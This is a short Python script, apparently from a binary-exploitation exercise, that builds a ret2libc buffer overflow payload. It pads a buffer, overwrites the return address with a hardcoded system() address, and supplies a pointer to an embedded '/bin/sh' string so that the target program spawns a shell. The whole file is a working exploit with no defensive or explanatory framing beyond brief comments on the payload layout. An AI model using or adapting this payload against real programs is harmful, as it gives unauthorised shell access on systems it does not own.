import sys

# payload = junk + system() + 4 junk bytes + /bin/sh address + /bin/sh
# /bin/sh address will always be 38_16 (56 base ten) registers ahead of the start of the buffer
system_addr = b"\xe0\xd8\xdc\xf7"
bin_addr = b"\x88\xcf\xff\xff"

# /bin/sh string in hex
shell_code = b"\x2f\x62\x69\x6e\x2f\x73\x68\x00"

payload = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + system_addr + b"AAAA" + bin_addr + shell_code 

sys.stdout.buffer.write(payload) 
